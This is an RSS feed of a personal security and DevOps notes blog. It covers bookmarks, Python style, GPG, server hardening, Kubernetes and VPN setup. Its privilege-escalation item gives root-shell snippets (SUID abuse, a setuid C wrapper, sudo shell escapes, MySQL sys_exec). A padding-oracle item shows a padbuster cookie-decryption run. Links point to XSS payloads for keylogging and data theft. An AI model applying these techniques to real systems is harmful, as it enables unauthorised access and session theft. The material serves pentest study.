<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>d47zm3</title>
    <link>https://d47zm3.me/categories/</link>
    <description>Recent content on d47zm3</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en</language>
    <lastBuildDate>Fri, 25 Jan 2019 15:11:00 +0100</lastBuildDate>
    
	<atom:link href="https://d47zm3.me/categories/index.xml" rel="self" type="application/rss+xml" />
    
    
    <item>
      <title>Bookmarks</title>
      <link>https://d47zm3.me/bookmarks/</link>
      <pubDate>Fri, 25 Jan 2019 15:11:00 +0100</pubDate>
      
      <guid>https://d47zm3.me/bookmarks/</guid>
      <description>Exploit Writing  Corelan Tutorials  linux (x86) exploit development series learning exploitation with offensive computer security 2.0 modern binary exploitation reverse engineering 101 stack buffer overflows: linux - chapter 1 smashing the stack for fun and profit courses and labs labs for the computer and network security class sans cyber aces pentest training hacking lab learn burp suite books the best security books to have in your library offensive computer security spring 2014 blue team blue team ctf wiki&amp;rsquo;s/notepads bhafsec pentnotes xapax security notepad powershell powershell basics programming learn x in y minutes devhints cheatsheets blogs jack hacks tulpa oscp guide tulpa osce guide abatchy&amp;rsquo;s oscp like vulnhub machines breaking into infosec schneier on security krebs on security how to build a successful career in cybersecurity useful tips for ctfs certificates crest coding practice python bug bounty bug bounty forum others infosec topics - mind map unix wildcards gone wild sans security posters github repositories bug bounty awesome bug bounty - a comprehensive curated list of available bug bounty &amp;amp; disclosure programs and write-ups windows jaws - just another windows (enum) script - enumerating windows using powershell awesome windows security - collection of links related to windows security lolbins - living off the land binaries and scripts - (lolbins and lolscripts) phishing gophish - open-source phishing toolkit cloud security aws_pwn - collection of aws penetration testing junk secrets fishing git-all-secrets linux kernel exploitation linux kernel exploitation - a bunch of links related to linux kernel exploitation auto root exploit - privilege escalate using known kernel exploits xss xss-payloads - site with js code that you could insert into xss payload that actually can hurt, keyloggers, stealing data etc.</description>
    </item>
    
    <item>
      <title>(Golang) Golang Courses</title>
      <link>https://d47zm3.me/resources/code/golang-courses/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://d47zm3.me/resources/code/golang-courses/</guid>
      <description>Links Gopher Guides - nice site with free video courses</description>
    </item>
    
    <item>
      <title>(Python) Creating your IDE (in VIM)</title>
      <link>https://d47zm3.me/resources/code/python-ide/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://d47zm3.me/resources/code/python-ide/</guid>
      <description>TODO</description>
    </item>
    
    <item>
      <title>(Python) Styling Guide (PEP8)</title>
      <link>https://d47zm3.me/resources/code/styling-guide/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://d47zm3.me/resources/code/styling-guide/</guid>
      <description>You can read it here. To start following it, install locally pycodestyle package and run it through your code.
~&amp;gt; pip install pycodestyle ~&amp;gt; pycodestyle --ignore=E501 run.py run.py:15:1: E302 expected 2 blank lines, found 1# main parser = argparse.ArgumentParser() parser.add_argument(&amp;#34;action&amp;#34;, choices=[&amp;#39;list&amp;#39;, &amp;#39;add&amp;#39;, &amp;#39;search&amp;#39;, &amp;#39;import&amp;#39;], help=&amp;#34;list local repositories, add new one or search by tags&amp;#34;) parser.add_argument(&amp;#34;--url&amp;#34;, nargs=&amp;#39;?&amp;#39;, help=&amp;#34;url of repository to add&amp;#34;) parser.add_argument(&amp;#34;--note&amp;#34;, nargs=&amp;#39;?&amp;#39;, help=&amp;#34;personal note about repository&amp;#34;) parser.add_argument(&amp;#34;--tags&amp;#34;, nargs=&amp;#39;?&amp;#39;, help=&amp;#34;tags for repository&amp;#34;) parser.</description>
    </item>
    
    <item>
      <title>AWS</title>
      <link>https://d47zm3.me/resources/devops/aws/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://d47zm3.me/resources/devops/aws/</guid>
      <description> Grant acces to your S3 bucket for other AWS account. { &amp;#34;Id&amp;#34;: &amp;#34;Policy1519815897918&amp;#34;, &amp;#34;Version&amp;#34;: &amp;#34;2012-10-17&amp;#34;, &amp;#34;Statement&amp;#34;: [ { &amp;#34;Sid&amp;#34;: &amp;#34;Stmt1519815367664&amp;#34;, &amp;#34;Action&amp;#34;: &amp;#34;s3:*&amp;#34;, &amp;#34;Effect&amp;#34;: &amp;#34;Allow&amp;#34;, &amp;#34;Resource&amp;#34;: &amp;#34;arn:aws:s3:::private-multimedia/*&amp;#34;, &amp;#34;Principal&amp;#34;: { &amp;#34;CanonicalUser&amp;#34;: &amp;#34;01b2fc158a01666bfb1b56da6ad958d3c6fe8702540de3af517106f9aca37766&amp;#34; } } ] }</description>
    </item>
    
    <item>
      <title>Code</title>
      <link>https://d47zm3.me/resources/code/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://d47zm3.me/resources/code/</guid>
      <description></description>
    </item>
    
    <item>
      <title>Code</title>
      <link>https://d47zm3.me/resources/code/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://d47zm3.me/resources/code/</guid>
      <description></description>
    </item>
    
    <item>
      <title>Cryptography</title>
      <link>https://d47zm3.me/resources/infosec/cryptography/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://d47zm3.me/resources/infosec/cryptography/</guid>
      <description> Courses  Introduction to Cryptography by Christof Paar  </description>
    </item>
    
    <item>
      <title>DevOps</title>
      <link>https://d47zm3.me/resources/devops/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://d47zm3.me/resources/devops/</guid>
      <description></description>
    </item>
    
    <item>
      <title>DevOps</title>
      <link>https://d47zm3.me/resources/devops/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://d47zm3.me/resources/devops/</guid>
      <description></description>
    </item>
    
    <item>
      <title>Environment</title>
      <link>https://d47zm3.me/resources/environment/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://d47zm3.me/resources/environment/</guid>
      <description></description>
    </item>
    
    <item>
      <title>Environment</title>
      <link>https://d47zm3.me/resources/environment/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://d47zm3.me/resources/environment/</guid>
      <description></description>
    </item>
    
    <item>
      <title>GPG</title>
      <link>https://d47zm3.me/resources/environment/gpg/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://d47zm3.me/resources/environment/gpg/</guid>
      <description>Set up GPG on computer to encrypt data &amp;amp; sign commits etc.
MacOS Guide ~&amp;gt; brew install gnupg pinentry-mac ~&amp;gt; cat ~/.gnupg/gpg-agent.conf # Connects gpg-agent to the OSX keychain via the brew-installed # pinentry program from GPGtools. This is the OSX &amp;#39;magic sauce&amp;#39;, # allowing the gpg key&amp;#39;s passphrase to be stored in the login # keychain, enabling automatic key signing. pinentry-program /usr/local/bin/pinentry-mac ~&amp;gt; cat ~/.gnupg/gpg.conf # Uncomment within config (or add this line) use-agent no-tty # This silences the &amp;#34;you need a passphrase&amp;#34; message once the passphrase handling is all set.</description>
    </item>
    
    <item>
      <title>Hacking Learning Platforms</title>
      <link>https://d47zm3.me/resources/infosec/hacking-learning-platforms/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://d47zm3.me/resources/infosec/hacking-learning-platforms/</guid>
      <description> Things you can hack for (free) &amp;amp; legally
Online Labs  Hack The Box
 Hacking Lab
 Pwnable.KR
 Root-Me
 Practical Pentest Labs
 Rozwal.To
  Vulnerable Applications To Deploy Yourself] OWASP Juice Shop
Miscellaneous  Mind Map - lots of links
 List of Hacking - source: https://www.blackroomsec.com/updated-hacking-challenge-site-links/
  </description>
    </item>
    
    <item>
      <title>Infosec</title>
      <link>https://d47zm3.me/resources/infosec/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://d47zm3.me/resources/infosec/</guid>
      <description></description>
    </item>
    
    <item>
      <title>Infosec</title>
      <link>https://d47zm3.me/resources/infosec/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://d47zm3.me/resources/infosec/</guid>
      <description></description>
    </item>
    
    <item>
      <title>Kubernetes</title>
      <link>https://d47zm3.me/resources/devops/kubernetes/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://d47zm3.me/resources/devops/kubernetes/</guid>
      <description>Everything related to Kubernetes.
Interesting Sites  Official Docs - best resource for Kubernetes
 Kubedex - great blog with posts on Kubernetes subjects, comparing solutions etc.
 Inguardians - blog from redteamers about hacking &amp;amp; securing kubernetes
 50 useful Kubernetes tools
  Customization, Service Mesh, gRPC (more advanced stuff) Kustomization  Kustomize: Deploy Your App with Template Free YAML - Ryan Cox, Lyft
 Kustomize: Kubernetes Configuration Customization - K8s, Kustomize &amp;amp; Ship SF Meetup</description>
    </item>
    
    <item>
      <title>Linux Network Monitoring Tools</title>
      <link>https://d47zm3.me/resources/devops/linux-network-monitoring-tools/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://d47zm3.me/resources/devops/linux-network-monitoring-tools/</guid>
      <description>Original Link: https://haydenjames.io/linux-networking-commands-scripts/
 arpwatch – ethernet activity monitor. bmon – bandwidth monitor and rate estimator. bwm-ng – live network bandwidth monitor. curl – transferring data with urls. darkstat – captures network traffic, usage statistics. dhclient – dynamic host configuration protocol client dig – query dns servers for information. dstat – replacement for vmstat, iostat, mpstat, netstat and ifstat. ethtool – utility for controlling network drivers and hardware. ftp – simplest file transfer protocol.</description>
    </item>
    
    <item>
      <title>Linux Privilege Escalation</title>
      <link>https://d47zm3.me/resources/infosec/linux-privilege-escalation/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://d47zm3.me/resources/infosec/linux-privilege-escalation/</guid>
      <description>MySQL running as ROOT If you have password, log in, issue that query, it will return exit code of command.
select sys_exec(&amp;#39;whoami&amp;#39;); Find SUID programs and abuse them find / -user root -perm -4000 -print 2&amp;gt;/dev/null student@attack:/$ /usr/bin/vim.tiny /etc/sudoers SUID binary to compile and hijack PATH #include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;sys/types.h&amp;gt;#include &amp;lt;unistd.h&amp;gt; int main() { setuid(0); system(&amp;#34;/bin/bash&amp;#34;); return 0; } Using System Tools # sudo find / -exec /bin/sh -I \; # sudo vi // inside :shell # sudo more/less // inside :bash # sudo python -c &amp;#34;import pty; pty.</description>
    </item>
    
    <item>
      <title>PKI</title>
      <link>https://d47zm3.me/resources/devops/pki/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://d47zm3.me/resources/devops/pki/</guid>
      <description>Based on great article here, just my notes and highlighted fragments. Taken from article https://smallstep.com/blog/everything-pki.html
TLDR: The goal of certificates and PKI is to bind names to public keys.
Terms like entity, identity, identifier, name, subscriber, end entity, certificate authority, root certificates, leaf certificates (these belong to end entities), relying party ( a certificate user that verifies and trusts certificates issued by a CA )
A message authentication code (MAC) is a bit of data that’s used to verify which entity sent a message, and to ensure that a message hasn’t been modified.</description>
    </item>
    
    <item>
      <title>Padding Oracle Attack</title>
      <link>https://d47zm3.me/resources/infosec/padding-oracle-attack/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://d47zm3.me/resources/infosec/padding-oracle-attack/</guid>
      <description>Performing Padding Oracle Attack using padBuster.
Stage 1: decrypt cookie root@bethebeast: ~ » padbuster http://hacker.com/profile.php vy7pPWXNdloJI%2BnkkaiRUNSmX6M5GmH9XcN3sA%2FSVRgXEjzt1hMOFw== -cookies &amp;#34;secret=vy7pPWXNdloJI%2BnkkaiRUNSmX6M5GmH9XcN3sA%2FSVRgXEjzt1hMOFw==; PHPSESSID=g2ea7aeakie1fvlff44rv456p2&amp;#34; 8 +-------------------------------------------+ | PadBuster - v0.3.3 | | Brian Holyfield - Gotham Digital Science | | labs@gdssecurity.com | +-------------------------------------------+ INFO: The original request returned the following [+] Status: 200 [+] Location: N/A [+] Content Length: 3854 INFO: Starting PadBuster Decrypt Mode *** Starting Block 1 of 4 *** INFO: No error string was provided.</description>
    </item>
    
    <item>
      <title>Personal Security Checklist</title>
      <link>https://d47zm3.me/resources/infosec/personal-security-checklist/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://d47zm3.me/resources/infosec/personal-security-checklist/</guid>
      <description>Be safe on the internet - An open source checklist of resources designed to improve your online privacy and security. Check things off to keep track as you go.</description>
    </item>
    
    <item>
      <title>Protecting Remote Server</title>
      <link>https://d47zm3.me/resources/environment/protecting-remote-server/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://d47zm3.me/resources/environment/protecting-remote-server/</guid>
      <description>Tips to protect remote server after fresh install, first thing you want to do is to update all packages and reboot system to apply kernel patches.
~&amp;gt; apt update &amp;amp;&amp;amp; apt upgrade -y Then disable logging in with cleartext passwords
~&amp;gt; vi /etc/ssh/sshd_config # PermitRootLogin (yes) =&amp;gt; (without-password|no) # PasswordAuthentication no ~&amp;gt; systemctl restart sshd Install Fail2Ban and create SSHD jail
~&amp;gt; apt install fail2ban ~&amp;gt; cat /etc/fail2ban/jail.d/defaults-debian.conf [11:22:10] [sshd] enabled = true port = ssh filter = sshd logpath = /var/log/auth.</description>
    </item>
    
    <item>
      <title>Resources</title>
      <link>https://d47zm3.me/resources/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://d47zm3.me/resources/</guid>
      <description>Content is being divided.</description>
    </item>
    
    <item>
      <title>Shells</title>
      <link>https://d47zm3.me/resources/environment/shells/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://d47zm3.me/resources/environment/shells/</guid>
      <description>From my experience two shells that are worth notice are
 ZSH Fish  In practice though, you can achieve Fish features installing particular plugins for ZSH, and yet, ZSH will still be more compatible with Bash, while Fish introduces it&amp;rsquo;s own syntax and quirks, which may be hard to adapt after long years with Bash/ZSH. Yet, still I find it very nice as out-of-box solution. Two very well known plugin packages for ZSH are</description>
    </item>
    
    <item>
      <title>Static Code Analysis</title>
      <link>https://d47zm3.me/resources/infosec/static-code-analysis/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://d47zm3.me/resources/infosec/static-code-analysis/</guid>
      <description> Performing static code analysis in order to find weak points.
Articles  great article from @bl4de on that subject
 another article from AppSecco
  Tools  relative-url-extractor
 waybackurls
 trufflehog
 eslint + security rules (node for example or angular)
 linkfinder
 nodejsscan
 retire.js
 awesome-static-analysis
  </description>
    </item>
    
    <item>
      <title>TMUX</title>
      <link>https://d47zm3.me/resources/environment/tmux/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://d47zm3.me/resources/environment/tmux/</guid>
      <description>Another tool I can&amp;rsquo;t live without. Available here and in various package repositories on most distribtuons. Where do I start&amp;hellip; Maintain multiple terminals with ease, split screen in as many parts, as you want, make nice toolbars with information, and most motable, attach and detach your work from any place (assuming you work on remote machine). It also supports plugins, but again, I&amp;rsquo;m using very little of them and just roll with my configuration and some plugin to help me see battery status in terminal and for logging, maintained by TPM.</description>
    </item>
    
    <item>
      <title>Tools</title>
      <link>https://d47zm3.me/resources/devops/tools/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://d47zm3.me/resources/devops/tools/</guid>
      <description>Generic page for interesting, useful tools, not really fitting into other category:
 mkcert - local TLS certificates with green lock via your own CA installed on system  </description>
    </item>
    
    <item>
      <title>Tricks</title>
      <link>https://d47zm3.me/resources/devops/tricks/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://d47zm3.me/resources/devops/tricks/</guid>
      <description>Miscellaneous tricks that did not made it into other categories.
Find Real IPs behind CloudFlare I&amp;rsquo;m using CrimeFlare for it.
Expose Local Server behind NAT via public VPS # run from machine which has access to private site ssh -R 8443:private-site:443 user@public_vps Now add new /etc/hosts entry reflecting vhost of private website pointing to public VPS IP and access it via https://private-site:8443/
Debugging on Container OS using Docker Actually it boils down to running Docker container which shares namespaces with host, installing tools there and debugging.</description>
    </item>
    
    <item>
      <title>VIM</title>
      <link>https://d47zm3.me/resources/environment/vim/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://d47zm3.me/resources/environment/vim/</guid>
      <description>It&amp;rsquo;s commonly available on hosts, has lots of potential, it&amp;rsquo;s fast, tons of plugins, master it to save your time (and life sometimes). While there are frameworks like this one, I found it too slow after installing all the bloat and running on pure VIM with .vimrc, no plugins though for now (no time to check these out), but maybe will expand this section in future. My base .vimrc is below:</description>
    </item>
    
    <item>
      <title>VPN</title>
      <link>https://d47zm3.me/resources/environment/vpn/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://d47zm3.me/resources/environment/vpn/</guid>
      <description>How to run your own VPN, and be able to switch IP when needed, also automate it! You will need some Cloud Provider which has API/CLI available to automate VM creation and then you will set up VPN server using ready scripts. Let&amp;rsquo;s roll with Digital Ocean for instance&amp;hellip; We will use :
 automatic VPN setup on fresh instance
 Digital Ocean provisioned Ubuntu instance
  I made wrapper around well known solution to set up your own VPN instance, that allows you to quickly (5 minutes) spin new instance for your usage.</description>
    </item>
    
    <item>
      <title>Wordpress</title>
      <link>https://d47zm3.me/resources/devops/wordpress/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://d47zm3.me/resources/devops/wordpress/</guid>
      <description>Update mutli-site primary URL In order to update main blog URL update these tables in database:
wp_options: change “siteurl” and “home” to the new URL (http://blog/) wp_sitemeta: there’s a “siteurl” field you’ll need to change here wp_site: change the only value here to your new domain wp_blogs: each subsite will have an entry here, you’ll need to update the domain column for each row Also, update wp-config.php file:
define( &amp;#39;DOMAIN_CURRENT_SITE&amp;#39;, &amp;#39;newblog.</description>
    </item>
    
    <item>
      <title>XSS</title>
      <link>https://d47zm3.me/resources/infosec/xss/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://d47zm3.me/resources/infosec/xss/</guid>
      <description>Everything related to XSS, tools, links, payloads, etc.
Tools  ezXSS - self hosted dashboard and server for your payloads
 bXSS - blind XSS application, had not played with it yet
  Sites  XSS Payloads - site with JavaScript code that can actually hurt, keyloggers, data stealing etc.
 XSS Hunter - site that helps you by serving prepared scripts and generates some basic payloads, helps finding blind injections.</description>
    </item>
    
  </channel>
</rss>